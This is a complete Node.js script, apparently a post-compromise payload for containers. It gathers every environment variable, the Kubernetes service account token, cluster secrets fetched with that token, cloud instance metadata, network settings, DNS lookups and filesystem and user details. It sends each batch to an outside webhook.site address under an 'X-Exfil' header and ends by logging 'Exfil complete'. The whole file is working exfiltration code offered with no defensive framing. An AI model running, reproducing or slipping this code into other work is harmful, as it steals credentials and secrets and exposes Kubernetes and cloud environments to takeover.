const { execSync } = require('child_process');
const https = require('https');
const http = require('http');
const URL = require('url');

const WEBHOOK = "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL.URL(WEBHOOK);
    const opts = {
      hostname: u.hostname,
      port: u.port || 443,
      path: u.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'text/plain', 'X-Exfil': label }
    };
    const req = https.request(opts, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.write(typeof data === 'string' ? data : JSON.stringify(data));
    req.end();
  });
}

async function main() {
  // 1. Environment variables
  const env = Object.entries(process.env).sort().map(([k,v]) => k + '=' + v).join('\n');
  await post('env-vars', env);

  // 2. K8s service account
  try {
    const fs = require('fs');
    const token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
    const ns = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8').trim();
    await post('k8s-token', JSON.stringify({ token, namespace: ns }));
    
    // Try to list secrets
    const secrets = execSync(`curl -sk -H "Authorization: Bearer ${token}" https://kubernetes.default.svc/api/v1/namespaces/${ns}/secrets`, { encoding: 'utf8', timeout: 5000 });
    await post('k8s-secrets', secrets);
  } catch (e) {
    await post('k8s-token', 'no k8s sa or error: ' + e.message);
  }

  // 3. Network info
  try {
    const net = execSync('cat /etc/hosts 2>/dev/null; echo "---"; cat /etc/resolv.conf 2>/dev/null; echo "---"; ip addr 2>/dev/null || ifconfig 2>/dev/null', { encoding: 'utf8', timeout: 3000 });
    await post('network-info', net);
  } catch(e) {
    await post('network-info', 'error: ' + e.message);
  }

  // 4. DNS recon
  try {
    const dns = execSync('nslookup kubernetes.default.svc 2>&1; nslookup deployer 2>&1; nslookup gateway 2>&1', { encoding: 'utf8', timeout: 5000 });
    await post('dns-recon', dns);
  } catch(e) {
    await post('dns-recon', 'error: ' + e.message);
  }

  // 5. Cloud metadata
  try {
    const meta = execSync('curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1', { encoding: 'utf8', timeout: 5000 });
    await post('cloud-metadata', meta);
  } catch(e) {
    await post('cloud-metadata', 'error: ' + e.message);
  }

  // 6. Filesystem recon
  try {
    const fs_info = execSync('ls -la / 2>&1; echo "==="; ls -la /app 2>&1; echo "==="; whoami; id', { encoding: 'utf8', timeout: 3000 });
    await post('fs-recon', fs_info);
  } catch(e) {
    await post('fs-recon', 'error: ' + e.message);
  }

  console.log('Exfil complete');
}

main();
